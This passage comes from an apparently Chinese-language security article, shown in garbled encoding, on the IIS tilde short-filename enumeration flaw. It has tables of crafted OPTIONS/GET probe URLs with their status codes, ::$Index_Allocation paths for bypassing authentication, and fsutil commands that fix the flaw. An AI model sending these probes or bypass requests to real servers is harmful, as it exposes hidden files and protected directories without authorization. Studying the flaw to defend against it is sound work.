<h4 id="æ”¯æŒæ–¹æ³•"><a href="#æ”¯æŒæ–¹æ³•" class="headerlink" title="æ”¯æŒæ–¹æ³•"></a>æ”¯æŒæ–¹æ³•</h4><p>DEBUGã€OPTIONSã€GETã€POSTã€HEADã€TRACE<br><strong>IIS 7.5(Windows 2008 R2)</strong> å’Œ <strong>IIS 8.0(Windows 2012)</strong> è¿‡ç¨‹ä¸­ï¼Œå½“ä½¿ç”¨ OPTIONS æ¥ä»£æ›¿ GET æ–¹æ³•æ—¶ï¼Œå¦‚æœè¯·æ±‚ä¸­çš„çŸ­æ–‡ä»¶åæ˜¯å­˜åœ¨çš„ï¼ŒIISå°±ä¼šè¿”å›ä¸€ä¸ªä¸ä¸€æ ·çš„é”™è¯¯ä¿¡æ¯ã€‚<strong>IIS 8.0</strong>ã€<strong>IIS 8.5</strong> å’Œ <strong>IIS 10.0</strong> çš„çŸ­æ–‡ä»¶åç§°å‡å¯ä»¥é€šè¿‡OPTIONSå’ŒTRACEæ–¹æ³•è¢«çŒœæµ‹æˆåŠŸã€‚</p>
<h4 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h4><ol>
<li>åˆ©ç”¨ <code>~</code> å­—ç¬¦çŒœè§£æš´éœ²çŸ­æ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹åï¼ˆä¸»è¦å±å®³ï¼‰</li>
<li>Net Framework çš„æ‹’ç»æœåŠ¡æ”»å‡» ï¼ˆå‰¯å±å®³ï¼‰ï¼š<br>æ®Soroush Daliliåœ¨ç ”ç©¶è¡¨æ˜ï¼Œæ”»å‡»è€…å¦‚æœåœ¨æ–‡ä»¶å¤¹åç§°ä¸­å‘å‘é€ä¸€ä¸ªä¸åˆæ³•çš„.Netæ–‡ä»¶è¯·æ±‚ï¼Œ.NeFrameworkå°†é€’å½’æœç´¢æ‰€æœ‰çš„æ ¹ç›®å½•ï¼Œæ¶ˆè€—ç½‘ç«™èµ„æºè¿›è€Œå¯¼è‡´DOSé—®é¢˜ã€‚å¾®è½¯è®¤ä¸ºæ­¤å±å®³æ˜¯å¯æ¢å¤çš„DOSï¼Œå°†åœ¨åç»­SPç‰ˆæœ¬ä¿®æ”¹ï¼Œæ­¤å¤„ä¸åšæ¢è®¨ç ”ç©¶ã€‚</li>
</ol>
<h4 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h4><ol>
<li>åªæœ‰å‰å…­ä½å­—ç¬¦ç›´æ¥æ˜¾ç¤ºï¼Œåç»­å­—ç¬¦ç”¨ ~1 æŒ‡ä»£ã€‚å…¶ä¸­æ•°å­— 1 è¿˜å¯ä»¥é€’å¢ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªæ–‡ä»¶åç±»ä¼¼çš„æ–‡ä»¶ï¼ˆåç§°å‰6ä½å¿…é¡»ç›¸åŒï¼Œä¸”åç¼€åå‰3ä½å¿…é¡»ç›¸åŒï¼‰ï¼›</li>
<li>åç¼€åæœ€é•¿åªæœ‰ 3 ä½ï¼Œå¤šä½™çš„è¢«æˆªæ–­ï¼Œè¶…è¿‡ 3 ä½çš„é•¿æ–‡ä»¶ä¼šç”ŸæˆçŸ­æ–‡ä»¶åï¼›</li>
<li>æ‰€æœ‰å°å†™å­—æ¯å‡è½¬æ¢æˆå¤§å†™å­—æ¯ï¼›</li>
<li>é•¿æ–‡ä»¶åä¸­å«æœ‰å¤šä¸ªâ€œ.â€ï¼Œä»¥æ–‡ä»¶åæœ€åä¸€ä¸ªâ€œ.â€ä½œä¸ºçŸ­æ–‡ä»¶ååç¼€ï¼›</li>
<li>é•¿æ–‡ä»¶åå‰ç¼€&#x2F;æ–‡ä»¶å¤¹åå­—ç¬¦é•¿åº¦ç¬¦åˆ 0-9 å’Œ Aa-Zz èŒƒå›´ä¸”éœ€è¦å¤§äºç­‰äº 9 ä½æ‰ä¼šç”ŸæˆçŸ­æ–‡ä»¶åï¼Œå¦‚æœåŒ…å«ç©ºæ ¼æˆ–è€…å…¶ä»–éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œä¸è®ºé•¿åº¦å‡ä¼šç”ŸæˆçŸ­æ–‡ä»¶ã€‚</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥åœ¨å¯ç”¨ .net çš„ IIS ä¸‹ä½¿ç”¨GETæ–¹æ³•æš´åŠ›åˆ—ä¸¾çŸ­æ–‡ä»¶åï¼ŒåŸå› æ˜¯æ”»å‡»è€…ä½¿ç”¨é€šé…ç¬¦ <code>*</code> å’Œ <code>?</code> å‘é€ä¸€ä¸ªè¯·æ±‚åˆ° IIS,å½“ IIS æ¥æ”¶åˆ°ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ä¸­åŒ…å« <code>~</code> è¯·æ±‚æ—¶ï¼Œå®ƒçš„ååº”æ˜¯ä¸åŒçš„ï¼Œå³è¿”å›çš„ HTTP çŠ¶æ€ç å’Œé”™è¯¯ä¿¡æ¯ä¸åŒã€‚åŸºäºè¿™ä¸ªç‰¹ç‚¹ï¼Œå¯ä»¥æ ¹æ® HTTP çš„å“åº”åŒºåˆ†ä¸€ä¸ªå¯ç”¨æˆ–è€…ä¸å¯ç”¨çš„æ–‡ä»¶ã€‚å¦‚ä¸‹è¡¨æ‰€ç¤ºä¸åŒ IIS ç‰ˆæœ¬è¿”å›ä¿¡æ¯çš„ä¸åŒï¼š</p>
<p><strong>IIS 5.0 ~ IIS 7.XçŸ­æ–‡ä»¶çŒœè§£HTTPå“åº”ä¿¡æ¯ï¼šè®¿é—®æ„é€ çš„æŸä¸ªå­˜åœ¨çš„çŸ­æ–‡ä»¶åï¼Œä¼šè¿”å›404ï¼›è®¿é—®æ„é€ çš„æŸä¸ªä¸å­˜åœ¨çš„çŸ­æ–‡ä»¶åï¼Œä¼šè¿”å›400ã€‚</strong></p>
<table>
<thead>
<tr>
<th>IIS VERSION</th>
<th>URL</th>
<th>Result&#x2F;Error Message</th>
</tr>
</thead>
<tbody><tr>
<td>IIS 6</td>
<td>&#x2F;valid*~1*&#x2F;.aspx</td>
<td>HTTP 404 - File not found</td>
</tr>
<tr>
<td>IIS 6</td>
<td>&#x2F;Invalid*~1*&#x2F;.aspx</td>
<td>HTTP 400 - Bad Request</td>
</tr>
<tr>
<td>IIS 5.X</td>
<td>&#x2F;valid*~1*</td>
<td>HTTP 404 - File not found</td>
</tr>
<tr>
<td>IIS 5.X</td>
<td>&#x2F;Invalid*~1*</td>
<td>HTTP 400 - Bad Request</td>
</tr>
<tr>
<td>IIS 7.X.NET.2(No Error Handling)</td>
<td>&#x2F;valid*~1*&#x2F;</td>
<td>Page contains: â€œError Code 0x00000000â€</td>
</tr>
<tr>
<td>IIS 7.X.NET.2(No Error Handling)</td>
<td>&#x2F;Invalid*~1*&#x2F;</td>
<td>Page contains: â€œError Code 0x80070002â€</td>
</tr>
</tbody></table>
<p><strong>IIS çŠ¶æ€ç çŒœè§£è¿‡ç¨‹ï¼šIISè¾ƒä½ç‰ˆæœ¬+ASP.NET ç¯å¢ƒä¸‹ä½¿ç”¨GETæ–¹æ³•åå¤å¾ªç¯çŒœæµ‹ï¼Œç›´åˆ°çŒœè§£å‡ºçŸ­æ–‡ä»¶å</strong></p>
<table>
<thead>
<tr>
<th>URL</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/*~1*/.aspx">http://sdl.me/*~1*/.aspx</a></td>
<td>404. Valid: one or more file(s)&#x2F;folder(s) with short name is&#x2F;are available on the server</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/a*~1*/.aspx">http://sdl.me/a*~1*/.aspx</a></td>
<td>404 - Valid: It starts withâ€œAâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/aa*~1*/.aspx">http://sdl.me/aa*~1*/.aspx</a></td>
<td>400 - Invalid: The second letter is notâ€œAâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/ab*~1*/.aspx">http://sdl.me/ab*~1*/.aspx</a></td>
<td>400 - Invalid: The second letter is notâ€œBâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/ac*~1*/.aspx">http://sdl.me/ac*~1*/.aspx</a></td>
<td>404 - Valid: The second letter is â€œCâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/ac%3f~1*/.aspx">http://sdl.me/ac%3f~1*/.aspx</a></td>
<td>400 - Invalid: It has more than three characters</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/ac%3f%3f%3f%3f~1/*/.aspx">http://sdl.me/ac%3f%3f%3f%3f~1\*/.aspx</a></td>
<td>404 - Valid: It has 6 or more than 6 characters</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1*/.aspx">http://sdl.me/acsecr~1*/.aspx</a></td>
<td>404 - Valid: It starts withâ€œACSECRâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr/~1/.aspx">http://sdl.me/acsecr\~1/.aspx</a></td>
<td>400 - Invalid: It is not a folder and it has an extension</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://dl.me/acsecr~1.%3f/.aspx">http://dl.me/acsecr~1.%3f/.aspx</a></td>
<td>400- Invalid: Extension has more than 1 character</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.%3f%3f%3f/.aspx">http://sdl.me/acsecr~1.%3f%3f%3f/.aspx</a></td>
<td>404 - Valid: Extension has 3 or more characters</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.a%3f%3f/.aspx">http://sdl.me/acsecr~1.a%3f%3f/.aspx</a></td>
<td>400 - Invalid: Extension does not start withâ€œAâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.h%3f%3f/.aspx">http://sdl.me/acsecr~1.h%3f%3f/.aspx</a></td>
<td>404 - Valid: Extension starts withâ€œHâ€</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1.htm/.aspx">http://sdl.me/acsecr~1.htm/.aspx</a></td>
<td>404 - Valid: Extension starts withâ€œHTMâ€</td>
</tr>
</tbody></table>
<p>ä½†æ˜¯åƒé‡Œç›®å®éªŒå®¤åœ¨çœŸå®ç¯å¢ƒéªŒè¯å‘ç°ï¼Œåœ¨IISé«˜ç‰ˆæœ¬ï¼ˆå¦‚ï¼šIIS 8.0&#x2F;IIS 8.5&#x2F;IIS 10.0ï¼‰ï¼Œå³ä½¿æ²¡æœ‰å®‰è£…asp.netï¼Œé€šè¿‡ <code>OPTIONS</code> å’Œ <code>TRACE</code> æ–¹æ³•ä¹Ÿå¯ä»¥çŒœè§£æˆåŠŸã€‚è¿™ä¸¤ç§æ–¹æ³•çŒœè§£è¿”å›çš„HTTPçŠ¶æ€ç ç±»å‹å’Œä¸Šè¿°è¡¨æ ¼å†…å®¹è¡¨æœ‰äº›è®¸å‡ºå…¥ï¼Œä½†æ˜¯ä¸å¤±ä¸ºå¦ä¸€ç§åˆ©ç”¨æ–¹å¼ã€‚</p>
<p><strong>IIS 10.0 çŸ­æ–‡ä»¶çŒœè§£è¿‡ç¨‹åˆ†æ</strong></p>
<table>
<thead>
<tr>
<th>åºå·</th>
<th>åŸå§‹æ‰«æåŒ…URLè§£ç </th>
<th>HTTPçŠ¶æ€ç </th>
<th>çŠ¶æ€ç å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>OPTIONS &#x2F;*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œå­˜åœ¨çŸ­æ–‡ä»¶æ¼æ´</td>
</tr>
<tr>
<td>2</td>
<td>OPTIONS &#x2F;?*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œå­˜åœ¨1ä¸ªåŠä»¥ä¸Šå­—æ¯å¼€å¤´çš„æ–‡ä»¶</td>
</tr>
<tr>
<td>3</td>
<td>OPTIONS &#x2F;*T*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­åŒ…å«å­—æ¯T</td>
</tr>
<tr>
<td>4</td>
<td>OPTIONS &#x2F;*~1.*T*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åç»¼ååŒ…å«å­—æ¯T</td>
</tr>
<tr>
<td>5</td>
<td>OPTIONS &#x2F;*S*~1*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­åŒ…å«å­—æ¯S</td>
</tr>
<tr>
<td>6</td>
<td>OPTIONS &#x2F;*~1.*H*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åç¼€ååŒ…å«å­—æ¯H</td>
</tr>
<tr>
<td>7</td>
<td>OPTIONS &#x2F;*~1.*M*\a.aspx?aspxerrorpath&#x3D;&#x2F;</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åç¼€ååŒ…å«å­—æ¯M</td>
</tr>
<tr>
<td>8</td>
<td>OPTIONS &#x2F;*0*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­åŒ…å«æ•°å­—0</td>
</tr>
<tr>
<td>9</td>
<td>OPTIONS &#x2F;*1*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­åŒ…å«æ•°å­—1</td>
</tr>
<tr>
<td>10</td>
<td>OPTIONS &#x2F;I*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­åŒ…å«å­—æ¯Iå¼€å¤´æ–‡ä»¶</td>
</tr>
<tr>
<td>11</td>
<td>OPTIONS &#x2F;I?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åIåé¢åŒ…å«0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>12</td>
<td>OPTIONS &#x2F;II*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­ç¬¬äºŒä¸ªå­—æ¯ä¸ºI</td>
</tr>
<tr>
<td>13</td>
<td>OPTIONS &#x2F;II?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åIIåé¢åŒ…å«0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>14</td>
<td>OPTIONS &#x2F;IIS*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­ç¬¬ä¸‰ä¸ªå­—æ¯ä¸ºS</td>
</tr>
<tr>
<td>15</td>
<td>OPTIONS &#x2F;IIS?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åIISåé¢åŒ…å«0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>16</td>
<td>OPTIONS &#x2F;IIS1*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­ç¬¬å››ä¸ªå­—ç¬¦ä¸ºæ•°å­—1</td>
</tr>
<tr>
<td>17</td>
<td>OPTIONS &#x2F;IIS1?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åIIS1åé¢åŒ…å«0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>18</td>
<td>OPTIONS &#x2F;IIS10*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­ç¬¬äº”ä¸ªå­—ç¬¦ä¸ºæ•°å­—0</td>
</tr>
<tr>
<td>19</td>
<td>OPTIONS &#x2F;IIS10?*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åIIS10åé¢åŒ…å«0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>20</td>
<td>OPTIONS &#x2F;IIS10T*~1*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åä¸­ç¬¬å…­ä¸ªå­—æ¯ä¸ºT</td>
</tr>
<tr>
<td>21</td>
<td>OPTIONS &#x2F;IIS10T~1?\a.aspx?aspxerrorpath</td>
<td>200</td>
<td>çŒœæµ‹å¤±è´¥ï¼Œä¸åŒ…å«å¤šä¸ªç›¸åŒçš„çŸ­æ–‡ä»¶å</td>
</tr>
<tr>
<td>22</td>
<td>OPTIONS &#x2F;IIS10T*~2*\a.aspx?aspxerrorpath</td>
<td>200</td>
<td>çŒœæµ‹å¤±è´¥ï¼Œä¸åŒ…å«2ä¸ªç›¸åŒçš„çŸ­æ–‡ä»¶å</td>
</tr>
<tr>
<td>23</td>
<td>OPTIONS &#x2F;IIS10T~1.H*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åæœªé‡å¤ä¸”åç¼€ä»¥å¼€å¤´</td>
</tr>
<tr>
<td>24</td>
<td>OPTIONS &#x2F;IIS10T~1.HT*\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸï¼Œæ–‡ä»¶åæœªé‡å¤ä¸”åç¼€ç¬¬äºŒå­—æ¯ä¸ºT</td>
</tr>
<tr>
<td>25</td>
<td>OPTIONS &#x2F;IIS10T~1.HTM\a.aspx?aspxerrorpath</td>
<td>404</td>
<td>çŒœæµ‹æˆåŠŸå¹¶ç»“æŸï¼ŒIIS10T~1.HIMè¢«çŒœæµ‹å‡ºæ¥</td>
</tr>
</tbody></table>
<p><strong>TRACEæ–¹æ³•çŒœè§£åˆ†æ</strong></p>
<p>é€šè¿‡TRACEæ–¹æ³•çŒœè§£çš„è¿‡ç¨‹åŸºæœ¬åŒä¸Šï¼Œåªä¸è¿‡æ­¤HTTPæ–¹æ³•çŒœè§£å¤±è´¥è¿”å›çš„çŠ¶æ€ç ä¸æ˜¯200ï¼Œè€Œæ˜¯501ï¼ˆæœªæ‰§è¡Œï¼‰ã€‚</p>
<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><h4 id="1-æ·±å…¥çˆ†ç ´çŒœæµ‹æ–‡ä»¶å…¨å"><a href="#1-æ·±å…¥çˆ†ç ´çŒœæµ‹æ–‡ä»¶å…¨å" class="headerlink" title="1. æ·±å…¥çˆ†ç ´çŒœæµ‹æ–‡ä»¶å…¨å"></a>1. æ·±å…¥çˆ†ç ´çŒœæµ‹æ–‡ä»¶å…¨å</h4><p>é€šè¿‡ IIS çŸ­æ–‡ä»¶æ¼æ´çŒœæµ‹å‡ºæ¥çš„çŸ­æ–‡ä»¶åç§°ï¼Œéœ€è¦ç»§ç»­çŒœæµ‹å‡ºå…¨åæ‰å¯ä»¥åœ¨IISä¸Šè¿›è¡Œè®¿é—®ï¼Œå³ IIS ç”±äºå®‰å…¨åŸå› ä¸æ”¯æŒçŸ­æ–‡ä»¶åè®¿é—®ã€‚ä»¥ä¸‹æ˜¯ Soroush Dalili ç»™å‡ºçš„å‡ ç§çŒœæµ‹æ–‡ä»¶å…¨åçš„æ–¹æ³•ï¼š</p>
<ol>
<li>é€šè¿‡å¯¹ç›®æ ‡ç½‘ç«™æˆ–åŒç±»å‹ç½‘ç«™è¿›è¡Œçˆ¬è™«ï¼Œçˆ¬å‡ºå»ºç«‹ä¸€ä¸ªå­—å…¸åº“ï¼Œå†ä¸å¾—åˆ°çš„çŸ­æ–‡ä»¶åæ¥çŒœå‰©ä¸‹çš„å­—ç¬¦ ï¼›</li>
<li>åˆ©ç”¨ <a target="_blank" rel="noopener" href="http://code.google.com/p/fuzzdb/">fuzzdb</a> (ä¸€ä¸ªåº”ç”¨ç¨‹åºæ¨¡ç³Šæµ‹è¯•(fuzzing)æ•°æ®åº“)æ¥çŒœè§£ï¼›</li>
<li>ç»“åˆOWASPçš„ <a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a> ï¼ˆä¸€æ¬¾è·¯å¾„åŠç½‘é¡µæš´åŠ›ç ´è§£çš„å·¥å…·ï¼‰ã€‚</li>
</ol>
<p>Github ä¸Šæœ‰ç ”ç©¶äººå‘˜å·²ç»ç”¨ python å°†ä¸Šè¿°æ–¹æ³•å®ç°ï¼Œå¹¶ä¸”è·å–åˆ°äº†ç½‘ç«™åå°çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¾ˆå¥½çš„åˆ©ç”¨äº† IIS çŸ­æ–‡ä»¶æ¼æ´ã€‚</p>
<blockquote>
<p>æ³¨ï¼š <br>ç ”ç©¶æŠ¥å‘Šåœ°å€ï¼š<a target="_blank" rel="noopener" href="https://webbreacher.com/2014/10/23/tilde-enumeration/">https://webbreacher.com/2014/10/23/tilde-enumeration/</a> ï¼ˆæ¨èï¼‰<br>python ç¨‹åºä¸‹è½½ï¼š<a target="_blank" rel="noopener" href="https://github.com/WebBreacher/tilde_enum">https://github.com/WebBreacher/tilde_enum</a> ï¼ˆæ¨èï¼‰</p>
</blockquote>
<h4 id="2-ç»“åˆæ”¯æŒçŸ­æ–‡ä»¶ç‰¹æ€§è½¯ä»¶ï¼ˆApacheã€Wordpressï¼‰"><a href="#2-ç»“åˆæ”¯æŒçŸ­æ–‡ä»¶ç‰¹æ€§è½¯ä»¶ï¼ˆApacheã€Wordpressï¼‰" class="headerlink" title="2. ç»“åˆæ”¯æŒçŸ­æ–‡ä»¶ç‰¹æ€§è½¯ä»¶ï¼ˆApacheã€Wordpressï¼‰"></a>2. ç»“åˆæ”¯æŒçŸ­æ–‡ä»¶ç‰¹æ€§è½¯ä»¶ï¼ˆApacheã€Wordpressï¼‰</h4><p>Acunetix ç ”ç©¶æŒ‡å‡ºå½“ Apache è¿è¡Œåœ¨ windows ä¸‹ï¼Œå¦‚æœåˆ›å»ºäº†ä¸€ä¸ªé•¿æ–‡ä»¶ï¼Œé‚£ä¹ˆæ— éœ€çŒœè§£é•¿æ–‡ä»¶ï¼Œç›´æ¥ç”¨çŸ­æ–‡ä»¶å°±å¯ä»¥ä¸‹è½½äº†ã€‚ä¾‹å¦‚ä¸€ä¸ª <code>backup_20180101.sql</code> çš„é•¿æ–‡ä»¶ï¼Œå…¶çŸ­æ–‡ä»¶æ˜¯ <code>BACKUP~1.SQL</code>ï¼Œæ”»å‡»è€…åªéœ€è¦æäº¤ <code>BACKUP~1.SQL</code> å°±å¯ä»¥ç›´æ¥è®¿é—®å¹¶ä¸‹è½½è¯¥æ–‡ä»¶ã€‚</p>
<p>æ­¤å¤–ï¼Œæœ‰å­¦è€…è¡¨æ˜ï¼Œå…¶åœ¨å®‰è£…Wordpresså¤‡ä»½æ’ä»¶ä¹‹åï¼Œé€šè¿‡çŸ­æ–‡ä»¶åæˆåŠŸåœ°è®¿é—®åˆ°äº†äº†WordPressåšå®¢çš„å¤‡ä»½æ–‡ä»¶ã€‚</p>
<h4 id="3-ç»•è¿‡Basic-and-Windowsè®¤è¯"><a href="#3-ç»•è¿‡Basic-and-Windowsè®¤è¯" class="headerlink" title="3. ç»•è¿‡Basic and Windowsè®¤è¯"></a>3. ç»•è¿‡Basic and Windowsè®¤è¯</h4><p>Soroush Dalilide ç ”ç©¶ä¸­è¿˜æåˆ°ï¼Œåœ¨æŸäº› IIS æœåŠ¡å™¨é…ç½®ä¸‹ï¼Œå¯ä»¥ç»•è¿‡ Basic and Windows è®¤è¯ï¼ŒçŒœè§£å‡ºè®¤è¯ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ä¸¾ä¾‹ï¼Œå¦‚æœéœ€è¦è®¿é—®ä¸€ä¸ªå¼€å¯è®¤è¯çš„ç›®å½•ä¸‹æ–‡ä»¶æ—¶ï¼Œæ¯”å¦‚è¿™ä¸ªç›®å½•æ˜¯ â€œAuthNeededâ€ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼è®¿é—®ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/AuthNeeded::$Index_Allocation/*~1*/.aspx</span><br><span class="line">æˆ–è€…</span><br><span class="line">/AuthNeeded:$I30:$Index_Allocation/*~1*/.aspx</span><br></pre></td></tr></table></figure>
<h3 id="æ­¤æ¼æ´å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªå±€é™ç‚¹ï¼š"><a href="#æ­¤æ¼æ´å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªå±€é™ç‚¹ï¼š" class="headerlink" title="æ­¤æ¼æ´å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªå±€é™ç‚¹ï¼š"></a>æ­¤æ¼æ´å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªå±€é™ç‚¹ï¼š</h3><ol>
<li>æ­¤æ¼æ´åªèƒ½ç¡®å®šå‰6ä¸ªå­—ç¬¦ï¼Œå¦‚æœåé¢çš„å­—ç¬¦å¤ªé•¿ã€åŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼Œå¾ˆéš¾çŒœè§£ï¼›</li>
<li>å¦‚æœæ–‡ä»¶åæœ¬èº«å¤ªçŸ­ï¼ˆæ— çŸ­æ–‡ä»¶åï¼‰ä¹Ÿæ˜¯æ— æ³•çŒœè§£çš„ï¼›</li>
<li>å¦‚æœæ–‡ä»¶åå‰6ä½å¸¦ç©ºæ ¼ï¼Œ8.3æ ¼å¼çš„çŸ­æ–‡ä»¶åä¼šè¡¥è¿›ï¼Œå’ŒçœŸå®æ–‡ä»¶åä¸åŒ¹é…ï¼›</li>
<li>å¦‚æœæ–‡ä»¶å¤¹åå‰6ä½å­—ç¬¦å¸¦ç‚¹â€œ.â€ï¼Œæ‰«æç¨‹åºä¼šè®¤ä¸ºæ˜¯æ–‡ä»¶è€Œä¸æ˜¯æ–‡ä»¶å¤¹ï¼Œæœ€ç»ˆå‡ºç°è¯¯æŠ¥ï¼›</li>
<li>ä¸æ”¯æŒä¸­æ–‡æ–‡ä»¶åï¼ŒåŒ…æ‹¬ä¸­æ–‡æ–‡ä»¶å’Œä¸­æ–‡æ–‡ä»¶å¤¹ã€‚ä¸€ä¸ªä¸­æ–‡ç›¸å½“äºä¸¤ä¸ªè‹±æ–‡å­—ç¬¦ï¼Œæ•…è¶…è¿‡4ä¸ªä¸­æ–‡å­—ä¼šäº§ç”ŸçŸ­æ–‡ä»¶åï¼Œä½†æ˜¯IISä¸æ”¯æŒä¸­æ–‡çŒœæµ‹ã€‚</li>
</ol>
<h3 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h3><h4 id="é€šç”¨æ¼æ´ä¿®å¤æ–¹æ¡ˆ"><a href="#é€šç”¨æ¼æ´ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="é€šç”¨æ¼æ´ä¿®å¤æ–¹æ¡ˆ"></a>é€šç”¨æ¼æ´ä¿®å¤æ–¹æ¡ˆ</h4><p><strong>1. CMDå…³é—­NTFS 8.3æ–‡ä»¶æ ¼å¼çš„æ”¯æŒ</strong><br>ä¸¾ä¾‹ï¼šï¼ˆ1ä»£è¡¨å…³é—­ï¼Œ0ä»£è¡¨å¼€å¯ï¼‰<br>Windows Server 2008 R2ï¼š<br>æŸ¥è¯¢æ˜¯å¦å¼€å¯çŸ­æ–‡ä»¶ååŠŸèƒ½ï¼šfsutil 8dot3name query<br>å…³é—­è¯¥åŠŸèƒ½ï¼šfsutil 8dot3name set 1<br>Windows Server 2003ï¼š<br>å…³é—­è¯¥åŠŸèƒ½ï¼šfsutil behavior set disable8dot3 1<br>ä¸åŒç³»ç»Ÿå…³é—­å‘½ä»¤ç¨æœ‰åŒºåˆ«ï¼Œè¯¥åŠŸèƒ½é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå¯¹äºå¤§å¤šæ•°ç”¨æˆ·æ¥è¯´æ— éœ€å¼€å¯ã€‚</p>
